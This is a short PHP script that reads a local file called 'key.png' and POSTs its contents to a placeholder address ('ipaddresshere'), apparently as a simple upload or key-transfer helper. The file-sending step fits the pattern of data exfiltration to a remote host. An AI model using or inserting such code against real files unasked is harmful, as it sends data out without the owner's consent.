<?php
$file = "key.png";
$myfile = fopen($file, "r") or die("Unable to open file!");
$god = fread($myfile,filesize($file));
// echo $god;
$url = 'http://ipaddresshere/index.php';
$data = array('key'=>$god);
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
var_dump($result);
?>